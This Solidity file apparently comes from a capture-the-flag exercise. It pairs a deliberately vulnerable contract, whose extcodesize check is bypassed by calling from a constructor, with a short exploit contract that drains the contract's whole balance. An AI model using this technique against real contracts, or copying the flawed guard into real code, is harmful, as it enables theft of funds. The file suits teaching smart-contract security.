pragma solidity 0.8.20;

contract CallMeMaybe {
    modifier callMeMaybe() {
        uint32 size;
        address _addr = msg.sender;
        assembly {
            size := extcodesize(_addr)
        }
        if (size > 0) {
            revert();
        }
        _;
    }

    function HereIsMyNumber() external callMeMaybe {
        if (tx.origin == msg.sender) {
            revert();
        } else {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}

contract CallMeMaybeHack {
    constructor(address payable _target) {
        CallMeMaybe(_target).HereIsMyNumber();
    }
}
